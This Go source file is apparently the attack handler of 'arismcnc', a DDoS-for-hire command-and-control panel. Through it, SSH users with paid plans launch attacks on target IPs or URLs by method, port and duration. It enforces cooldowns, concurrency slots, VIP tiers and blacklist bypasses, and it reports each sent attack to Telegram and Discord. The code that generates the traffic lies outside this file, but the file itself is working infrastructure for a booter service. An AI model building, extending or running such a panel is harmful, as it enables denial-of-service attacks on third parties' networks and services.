package handlers

import (
	"arismcnc/database"
	"arismcnc/managers"
	"arismcnc/utils"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gliderlabs/ssh"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

var (
	apiLastAttackTime time.Time
	apiCooldownMutex  sync.Mutex
	notificationConfig *NotificationConfig
	configMutex sync.RWMutex
)


type NotificationConfig struct {
	Global struct {
		Enabled     bool `json:"enabled"`
		LogInFiles  bool `json:"log_in_files"`
	} `json:"global"`
	DiscordIntegration map[string]struct {
		WebhookURL string `json:"webhook_url"`
		Title      string `json:"title"`
		Image      string `json:"image"`
		HexColor   string `json:"hex_color"`
		Enabled    bool   `json:"enabled"`
	} `json:"Discord_Integration"`
	TelegramIntegration map[string]struct {
		Token   string `json:"token"`
		ChatID  string `json:"chat_id"`
		Title   string `json:"title"`
		Enabled bool   `json:"enabled"`
	} `json:"Telegram_Integration"`
}


func notifyAccountCreation(username, createdBy, planDescription, expiryDate string) {
	config, err := loadNotificationConfig()
	if err != nil {
		return
	}

	var telegramConfig, discordConfig struct {
		enabled bool
		token   string
		chatID  string
		title   string
		webhook string
		color   string
		image   string
	}

	if config.TelegramIntegration != nil {
		if accountConfig, ok := config.TelegramIntegration["Account_Creation_Register"]; ok {
			if accountConfig.Enabled && accountConfig.Token != "" && accountConfig.ChatID != "" {
				telegramConfig.enabled = true
				telegramConfig.token = accountConfig.Token
				telegramConfig.chatID = accountConfig.ChatID
				telegramConfig.title = accountConfig.Title
			}
		}
	}

	if config.DiscordIntegration != nil {
		if accountConfig, ok := config.DiscordIntegration["Account_Creation_Register"]; ok {
			if accountConfig.Enabled && accountConfig.WebhookURL != "" {
				discordConfig.enabled = true
				discordConfig.webhook = accountConfig.WebhookURL
				discordConfig.title = accountConfig.Title
				discordConfig.color = accountConfig.HexColor
				discordConfig.image = accountConfig.Image
			}
		}
	}

	if !telegramConfig.enabled && !discordConfig.enabled {
		return
	}

	message := fmt.Sprintf("❗ *New Account Created* ❗\n\n"+
		"👨‍🦱¤ *Username:* `%s`\n"+
		"👑· *Created By:* `%s`\n"+
		"📜 *Plan Details:* `%s`\n"+
		"📅 *Expiry Date:* `%s`\n"+
		"⏱️ *Creation Time:* %s",
		username, createdBy, planDescription, expiryDate,
		time.Now().Format("2006-01-02 15:04:05 MST"))

	if telegramConfig.enabled {
		go func() {
			_ = sendTelegramNotification(
				telegramConfig.token,
				telegramConfig.chatID,
				telegramConfig.title,
				message,
			)
		}()
	}

	if discordConfig.enabled {
		go func() {
			_ = sendDiscordNotification(
				discordConfig.webhook,
				discordConfig.title,
				message,
				discordConfig.color,
				discordConfig.image,
				"account",
			)
		}()
	}
}


func notifySSHAttack(username, target, port, duration, method string) {
	config, err := loadNotificationConfig()
	if err != nil {
		return
	}

	var telegramConfig, discordConfig struct {
		enabled bool
		token   string
		chatID  string
		title   string
		webhook string
		color   string
		image   string
	}

	if config.TelegramIntegration != nil {
		if attackConfig, ok := config.TelegramIntegration["Attack_Sent"]; ok {
			if attackConfig.Enabled && attackConfig.Token != "" && attackConfig.ChatID != "" {
				telegramConfig.enabled = true
				telegramConfig.token = attackConfig.Token
				telegramConfig.chatID = attackConfig.ChatID
				telegramConfig.title = attackConfig.Title
			}
		}
	}

	if config.DiscordIntegration != nil {
		if attackConfig, ok := config.DiscordIntegration["Attack_Sent"]; ok {
			if attackConfig.Enabled && attackConfig.WebhookURL != "" {
				discordConfig.enabled = true
				discordConfig.webhook = attackConfig.WebhookURL
				discordConfig.title = attackConfig.Title
				discordConfig.color = attackConfig.HexColor
				discordConfig.image = attackConfig.Image
			}
		}
	}

	if !telegramConfig.enabled && !discordConfig.enabled {
		return
	}

	message := fmt.Sprintf("✅ *Attack Successfully Sent via SSH*  ✅\n\n"+
		"⚠️ *Username:* `%s`\n"+
		"🎯 *Target:* `%s`\n"+
		"🔌 *Port:* `%s`\n"+
		"⏱ *Duration:* `%s`\n"+
		"⚡  *Method:* `%s`\n"+
		"🕐 *Date/Time:* %s",
		username, target, port, duration, method,
		time.Now().Format("2006-01-02 15:04:05 MST"))

	if telegramConfig.enabled {
		go func() {
			_ = sendTelegramNotification(
				telegramConfig.token,
				telegramConfig.chatID,
				telegramConfig.title,
				message,
			)
		}()
	}

	if discordConfig.enabled {
		go func() {
			_ = sendDiscordNotification(
				discordConfig.webhook,
				discordConfig.title,
				message,
				discordConfig.color,
				discordConfig.image,
				"attack",
			)
		}()
	}
}


func loadNotificationConfig() (*NotificationConfig, error) {
	configMutex.Lock()
	defer configMutex.Unlock()
	
	if notificationConfig != nil {
		return notificationConfig, nil
	}
	
	file, err := os.Open("assets/logs/logs.json")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var config NotificationConfig
	decoder := json.NewDecoder(file)
	err = decoder.Decode(&config)
	if err != nil {
		return nil, err
	}

	notificationConfig = &config
	return notificationConfig, nil
}


func sendTelegramNotification(token, chatID, title, message string) error {
	if token == "" || chatID == "" {
		return fmt.Errorf("telegram configuration missing")
	}

	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		return err
	}

	chatIDInt, err := strconv.ParseInt(chatID, 10, 64)
	if err != nil {
		return err
	}

	fullMessage := fmt.Sprintf(" *%s* \n\n%s", title, message)
	msg := tgbotapi.NewMessage(chatIDInt, fullMessage)
	msg.ParseMode = "Markdown"
	msg.DisableNotification = false

	_, err = bot.Send(msg)
	return err
}


func sendDiscordNotification(webhookURL, title, message, color, image, eventType string) error {
	if webhookURL == "" {
		return fmt.Errorf("discord webhook URL not configured")
	}

	color = strings.TrimPrefix(color, "#")

	colorDecimal, err := strconv.ParseInt(color, 16, 64)
	if err != nil {
		switch eventType {
		case "attack":
			colorDecimal = 65280
		case "blacklist":
			colorDecimal = 16711680
		case "account":
			colorDecimal = 3447003
		case "api":
			colorDecimal = 10181046
		default:
			colorDecimal = 3447003
		}
	}

	eventText := "Event"
	switch eventType {
	case "attack":
		eventText = "Attack Successfully Sent"
	case "blacklist":
		eventText = "Blocked Attack Attempt"
	case "account":
		eventText = "New Account Created"
	case "api":
		eventText = "API Log"
	}

	payload := map[string]interface{}{
		"embeds": []map[string]interface{}{
			{
				"title":       title,
				"description": message,
				"color":       colorDecimal,
				"timestamp":   time.Now().Format(time.RFC3339),
				"thumbnail": map[string]string{
					"url": image,
				},
				"fields": []map[string]string{
					{
						"name":  " Event Type",
						"value": eventText,
					},
				},
			},
		},
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent && resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord webhook error: %s", string(body))
	}

	return nil
}


func notifyBlacklistAttempt(username, target, port, duration, method string) {
	config, err := loadNotificationConfig()
	if err != nil {
		return
	}

	var telegramConfig, discordConfig struct {
		enabled bool
		token   string
		chatID  string
		title   string
		webhook string
		color   string
		image   string
	}

	if config.TelegramIntegration != nil {
		if blacklistConfig, ok := config.TelegramIntegration["Blacklisted_Host"]; ok {
			if blacklistConfig.Enabled && blacklistConfig.Token != "" && blacklistConfig.ChatID != "" {
				telegramConfig.enabled = true
				telegramConfig.token = blacklistConfig.Token
				telegramConfig.chatID = blacklistConfig.ChatID
				telegramConfig.title = blacklistConfig.Title
			}
		}
	}
	
	if config.DiscordIntegration != nil {
		if blacklistConfig, ok := config.DiscordIntegration["Blacklisted_Host"]; ok {
			if blacklistConfig.Enabled && blacklistConfig.WebhookURL != "" {
				discordConfig.enabled = true
				discordConfig.webhook = blacklistConfig.WebhookURL
				discordConfig.title = blacklistConfig.Title
				discordConfig.color = blacklistConfig.HexColor
				discordConfig.image = blacklistConfig.Image
			}
		}
	}
	
	if !telegramConfig.enabled && !discordConfig.enabled {
		return
	}

	message := fmt.Sprintf("🚫 *Blocked Attack Attempt* 🚫\n\n"+
		"⚠️ *Username:* `%s`\n"+
		"🎯 *Target:* `%s`\n"+
		"🔌 *Port:* `%s`\n"+
		"⏱ *Duration:* `%s`\n"+
		"⚡  *Method:* `%s`\n"+
		"🕐 *Date/Time:* %s",
		"🎯️*IP/Target:* %s",
		username, target, port, duration, method,
		time.Now().Format("2006-01-02 15:04:05 MST"),
		target)

	if telegramConfig.enabled {
		go func() {
			_ = sendTelegramNotification(
				telegramConfig.token,
				telegramConfig.chatID,
				telegramConfig.title,
				message,
			)
		}()
	}

	if discordConfig.enabled {
		go func() {
			_ = sendDiscordNotification(
				discordConfig.webhook,
				discordConfig.title,
				message,
				discordConfig.color,
				discordConfig.image,
				"blacklist",
			)
		}()
	}
}

func checkAPIGlobalCooldown() bool {
	config, err := utils.LoadConfig("assets/config.json")
	if err != nil {
		return true
	}

	apiOptions := config.GetAPIOptions()
	
	if !apiOptions.APIGlobalCooldown.Enabled {
		return true
	}

	apiCooldownMutex.Lock()
	defer apiCooldownMutex.Unlock()

	now := time.Now()
	cooldownDuration := time.Duration(apiOptions.APIGlobalCooldown.PerAttackDelayMs) * time.Millisecond
	
	if now.Sub(apiLastAttackTime) >= cooldownDuration {
		apiLastAttackTime = now
		return true
	}
	
	return false
}

func AttackHandler(db *database.Database, session ssh.Session, args []string) {
	userInfo := db.GetAccountInfo(session.User())
	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	if err != nil {
		return
	}
	methods := utils.GetMethodsList()

	if !managers.Contains(methods, args[0]) {
		return
	}

	if len(args) < 4 {
		invalidUsage := utils.Branding(session, "invalid-usage", map[string]interface{}{
			"user.Username":            session.User(),
			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
			"user.Admin":               utils.CalculateInt(userInfo.Admin),
			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
			"user.Private":             utils.CalculateInt(userInfo.Private),
			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
			"user.SSH_Client":          session.Context().ClientVersion(),
			"user.Created_by":          userInfo.CreatedBy,
			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
			"clear":                    "\x1b[2J \x1b[H",
			"sleep": func(duration int) {
				time.Sleep(time.Duration(duration) * time.Millisecond)
			},
		})
		utils.SendMessage(session, invalidUsage+"\u001B[0m", true)
		return
	}
	
	if db.IsAccountExpired(session.User()) {
		utils.SendMessage(session, "\u001B[91mYour plan has expired.\u001B[0m", true)
		return
	}
	
	if !checkAPIGlobalCooldown() {
		utils.SendMessage(session, "\u001B[91mGlobal API cooldown active, please wait\u001B[0m", true)
		return
	}
	
	config, err := utils.LoadConfig("assets/config.json")
	if err != nil {
		utils.SendMessage(session, "\u001B[91mError loading configuration\u001B[0m", true)
		return
	}
	
	canBypass := userInfo.Admin == 1 && config.AdminsBypassDisabled()
	if !config.IsAttacksEnabled() && !canBypass {
		attacks_disabled := utils.Branding(session, "attacks-disabled", map[string]interface{}{
			"user.Username":            session.User(),
			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
			"user.Admin":               utils.CalculateInt(userInfo.Admin),
			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
			"user.Private":             utils.CalculateInt(userInfo.Private),
			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
			"user.SSH_Client":          session.Context().ClientVersion(),
			"user.Created_by":          userInfo.CreatedBy,
			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
			"clear":                    "\x1b[2J \x1b[H",
			"sleep": func(duration int) {
				time.Sleep(time.Duration(duration) * time.Millisecond)
			},
		})
		utils.SendMessage(session, attacks_disabled, true)
		return
	}
	
	if len(args) > 1 && !isValidTarget(args[1]) {
		invalidUsage := utils.Branding(session, "invalid-usage", map[string]interface{}{
			"user.Username":            session.User(),
			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
			"user.Admin":               utils.CalculateInt(userInfo.Admin),
			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
			"user.Private":             utils.CalculateInt(userInfo.Private),
			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
			"user.SSH_Client":          session.Context().ClientVersion(),
			"user.Created_by":          userInfo.CreatedBy,
			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
			"clear":                    "\x1b[2J \x1b[H",
			"sleep": func(duration int) {
				time.Sleep(time.Duration(duration) * time.Millisecond)
			},
		})
		utils.SendMessage(session, invalidUsage, true)
		return
	}
	
	if userInfo.BypassBlacklist != 1 && isBlacklisted(db, session, args) {
		lm, err := managers.NewLogManager("./assets/logs/logs.json")
		if err != nil {
			os.Exit(1)
		}
		defer lm.Close()

		lm.Log("User tried to attack blocked target (C2)!\nUsername: " + session.User() + "\nTarget: " + args[1] + "\nPort: " + args[2] + "\nTime: " + args[3] + "\nMethod: " + args[0] + "\n----------------------")
		blocked_target := utils.Branding(session, "blocked-target", map[string]interface{}{
			"user.Username":            session.User(),
			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
			"user.Admin":               utils.CalculateInt(userInfo.Admin),
			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
			"user.Private":             utils.CalculateInt(userInfo.Private),
			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
			"user.SSH_Client":          session.Context().ClientVersion(),
			"user.Created_by":          userInfo.CreatedBy,
			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
			"clear":                    "\x1b[2J \x1b[H",
			"sleep": func(duration int) {
				time.Sleep(time.Duration(duration) * time.Millisecond)
			},
		})
		utils.SendMessage(session, blocked_target, true)
		return
	}
	
	if userInfo.BypassSpam != 1 {
		_ = utils.InitSpamProtection()
		
		target := args[1]
		isSpam, shouldBlock, _, shouldCloseSession, spamMsg := utils.CheckSpamProtection(session.User(), target)

		if isSpam && shouldBlock {
			spam_prot := utils.Branding(session, "spam-protection", map[string]interface{}{
				"user.Username":            session.User(),
				"user.Expiry":              utils.CalculateExpiryString(expiryTime),
				"user.Admin":               utils.CalculateInt(userInfo.Admin),
				"user.Vip":                 utils.CalculateInt(userInfo.Vip),
				"user.Private":             utils.CalculateInt(userInfo.Private),
				"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
				"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
				"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
				"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
				"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
				"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
				"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
				"user.SSH_Client":          session.Context().ClientVersion(),
				"user.Created_by":          userInfo.CreatedBy,
				"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
				"spam.Message":             spamMsg,
				"clear":                    "\x1b[2J \x1b[H",
				"sleep": func(duration int) {
					time.Sleep(time.Duration(duration) * time.Millisecond)
				},
			})
			utils.SendMessage(session, spam_prot, true)
			
			if shouldCloseSession {
				RemoveUser(session.User())
				session.Close()
			}

			return
		}
	}
	
	if userInfo.BypassSpam != 1 && db.IsSpamming(session.User()) {
		spam_prot := utils.Branding(session, "spam-protection", map[string]interface{}{
			"user.Username":            session.User(),
			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
			"user.Admin":               utils.CalculateInt(userInfo.Admin),
			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
			"user.Private":             utils.CalculateInt(userInfo.Private),
			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
			"user.SSH_Client":          session.Context().ClientVersion(),
			"user.Created_by":          userInfo.CreatedBy,
			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
			"clear":                    "\x1b[2J \x1b[H",
			"sleep": func(duration int) {
				time.Sleep(time.Duration(duration) * time.Millisecond)
			},
		})
		utils.SendMessage(session, spam_prot, true)
		return
	}
	
	if !validateSlots(db, session, config, args[0], userInfo) {
		return
	}
	
	if !checkCooldowns(db, session, config, userInfo) {
		return
	}
	
	if db.GetUserCurrentAttacksCount(session.User()) >= userInfo.Concurrents {
		concurents_max := utils.Branding(session, "concurrents-limit", map[string]interface{}{
			"user.Username":            session.User(),
			"user.Expiry":              utils.CalculateExpiryString(expiryTime),
			"user.Admin":               utils.CalculateInt(userInfo.Admin),
			"user.Vip":                 utils.CalculateInt(userInfo.Vip),
			"user.Private":             utils.CalculateInt(userInfo.Private),
			"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
			"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
			"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
			"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
			"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
			"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
			"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
			"user.SSH_Client":          session.Context().ClientVersion(),
			"user.Created_by":          userInfo.CreatedBy,
			"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
			"clear":                    "\x1b[2J \x1b[H",
			"sleep": func(duration int) {
				time.Sleep(time.Duration(duration) * time.Millisecond)
			},
		})
		utils.SendMessage(session, concurents_max, true)
		return
	}
	if userInfo.PowerSaving != 1 {
		if db.IsTargetCurrentlyUnderAttack(args[1]) {
			target_underatk := utils.Branding(session, "target-under-attack", map[string]interface{}{
				"user.Username":            session.User(),
				"user.Expiry":              utils.CalculateExpiryString(expiryTime),
				"user.Admin":               utils.CalculateInt(userInfo.Admin),
				"user.Vip":                 utils.CalculateInt(userInfo.Vip),
				"user.Private":             utils.CalculateInt(userInfo.Private),
				"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
				"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
				"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
				"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
				"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
				"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
				"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
				"user.SSH_Client":          session.Context().ClientVersion(),
				"user.Created_by":          userInfo.CreatedBy,
				"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
				"clear":                    "\x1b[2J \x1b[H",
				"sleep": func(duration int) {
					time.Sleep(time.Duration(duration) * time.Millisecond)
				},
			})
			utils.SendMessage(session, target_underatk, true)
			return
		}
	}
	
	vip := userInfo.Vip == 1
	private := userInfo.Private == 1
	admin := userInfo.Admin == 1
	maxtime := userInfo.Maxtime
	
	atk, err := managers.NewAttack(session, args, vip, private, admin, maxtime, db)
	if err != nil {
		session.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		return
	}
	
	isError, errMsg, msg := atk.Build(session, db)
	if isError {
		utils.SendMessage(session, fmt.Sprintf("\u001B[91m%s\u001B[0m", errMsg.Error()), true)
	} else {
		utils.SendMessage(session, msg, true)
		db.LogAttack(session.User(), atk.Target, atk.Port, int(atk.Duration), atk.MethodName)
		
		go notifySSHAttack(session.User(), atk.Target, atk.Port, args[3], atk.MethodName)
	}
}

func isValidTarget(target string) bool {
	return strings.HasPrefix(target, "http://") || strings.HasPrefix(target, "https://") || managers.ValidIP4(target)
}

func isBlacklisted(db *database.Database, session ssh.Session, args []string) bool {
	blacklist := utils.ReadBlacklist("assets/blacklists/list.json")
	target := args[1]

	cleanTarget := strings.TrimPrefix(target, "http://")
	cleanTarget = strings.TrimPrefix(cleanTarget, "https://")
	cleanTarget = strings.Split(cleanTarget, "/")[0]
	cleanTarget = strings.Split(cleanTarget, ":")[0]

	for _, blockedEntry := range blacklist.IPs {
		if blockedEntry == "" {
			continue
		}

		cleanBlocked := strings.TrimPrefix(blockedEntry, "http://")
		cleanBlocked = strings.TrimPrefix(cleanBlocked, "https://")
		cleanBlocked = strings.Split(cleanBlocked, "/")[0]
		cleanBlocked = strings.Split(cleanBlocked, ":")[0]

		if cleanTarget == cleanBlocked {
			duration := "N/A"
			method := "N/A"
			if len(args) >= 4 {
				duration = args[3]
			}
			if len(args) >= 1 {
				method = args[0]
			}
			
			port := "N/A"
			if len(args) >= 3 {
				port = args[2]
			}

			go notifyBlacklistAttempt(session.User(), target, port, duration, method)
			
			return true
		}

		if strings.HasPrefix(cleanBlocked, ".") && strings.HasSuffix(cleanTarget, cleanBlocked) {
			duration := "N/A"
			method := "N/A"
			if len(args) >= 4 {
				duration = args[3]
			}
			if len(args) >= 1 {
				method = args[0]
			}
			
			port := "N/A"
			if len(args) >= 3 {
				port = args[2]
			}

			go notifyBlacklistAttempt(session.User(), target, port, duration, method)
			
			return true
		}

		if strings.Contains(cleanTarget, cleanBlocked) && cleanBlocked != "" {
			duration := "N/A"
			method := "N/A"
			if len(args) >= 4 {
				duration = args[3]
			}
			if len(args) >= 1 {
				method = args[0]
			}
			
			port := "N/A"
			if len(args) >= 3 {
				port = args[2]
			}

			go notifyBlacklistAttempt(session.User(), target, port, duration, method)
			
			return true
		}
	}

	hasValidASN := false
	for _, asn := range blacklist.ASNs {
		if asn != "" && asn != " " {
			hasValidASN = true
			break
		}
	}

	if hasValidASN {
		asn := getTargetASN(cleanTarget)
		if asn != "" {
			cleanASN := strings.TrimPrefix(strings.ToUpper(asn), "AS")

			for _, blockedASN := range blacklist.ASNs {
				if blockedASN == "" || blockedASN == " " {
					continue
				}

				cleanBlockedASN := strings.TrimPrefix(strings.ToUpper(blockedASN), "AS")

				if cleanASN == cleanBlockedASN {
					duration := "N/A"
					method := "N/A"
					if len(args) >= 4 {
						duration = args[3]
					}
					if len(args) >= 1 {
						method = args[0]
					}
					
					port := "N/A"
					if len(args) >= 3 {
						port = args[2]
					}

					go notifyBlacklistAttempt(session.User(), target, port, duration, method)
					
					return true
				}
			}
		}
	}

	return false
}

func getTargetASN(target string) string {
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimPrefix(target, "https://")
	target = strings.Split(target, "/")[0]
	target = strings.Split(target, ":")[0]

	ip := target
	if !managers.ValidIP4(target) {
		ips, err := net.LookupIP(target)
		if err != nil || len(ips) == 0 {
			return ""
		}
		ip = ips[0].String()
	}

	asn := lookupASNIPAPI(ip)
	if asn != "" {
		return asn
	}

	asn = lookupASNIPInfo(ip)
	if asn != "" {
		return asn
	}

	return ""
}

func lookupASNIPAPI(ip string) string {
	apiURL := fmt.Sprintf("http://ip-api.com/json/%s?fields=as", ip)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(apiURL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return ""
	}

	var result struct {
		AS string `json:"as"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return ""
	}

	if result.AS != "" {
		parts := strings.Fields(result.AS)
		if len(parts) > 0 {
			return parts[0]
		}
	}

	return ""
}

func lookupASNIPInfo(ip string) string {
	apiURL := fmt.Sprintf("https://ipinfo.io/%s/json", ip)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(apiURL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return ""
	}

	var result struct {
		Org string `json:"org"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return ""
	}

	if result.Org != "" {
		parts := strings.Fields(result.Org)
		if len(parts) > 0 && strings.HasPrefix(parts[0], "AS") {
			return parts[0]
		}
	}

	return ""
}

func validateSlots(db *database.Database, session ssh.Session, config *utils.Config, method string, userInfo database.AccountInfo) bool {
	currentAttacks := db.GetCurrentAttacksLength()

	methodConfig, err := utils.GetMethodConfig(method)
	if err != nil {
		utils.SendMessage(session, "\u001B[91mMethod configuration not found\u001B[0m", true)
		return false
	}

	if db.GetCurrentAttacksLength2(methodConfig.Method) >= methodConfig.Slots {
		utils.SendMessage(session, "\u001B[91mAll slots of method `"+methodConfig.Method+"` ("+strconv.Itoa(methodConfig.Slots)+") are currently in use!\u001B[0m", true)
		return false
	}

	if currentAttacks > config.Global_slots {
		utils.SendMessage(session, "\u001B[91mGlobal network slots ("+strconv.Itoa(config.Global_slots)+") are currently in use\u001B[0m", true)
		return false
	}
	return true
}

func checkCooldowns(db *database.Database, session ssh.Session, config *utils.Config, userInfo database.AccountInfo) bool {
	if userInfo.Admin != 1 {
		if cooldown := db.HowLongOnCooldown(session.User(), userInfo.Cooldown); cooldown > 0 {
			utils.SendMessage(session, fmt.Sprintf("You are on cooldown. (%d seconds left)\u001B[0m", cooldown), true)
			return false
		}

		if globalCooldown := db.HowLongOnGlobalCooldown(config.Global_cooldown); globalCooldown > 0 {
			utils.SendMessage(session, fmt.Sprintf("You are on global cooldown. (%d seconds left)\u001B[0m", globalCooldown), true)
			return false
		}
	}
	return true
}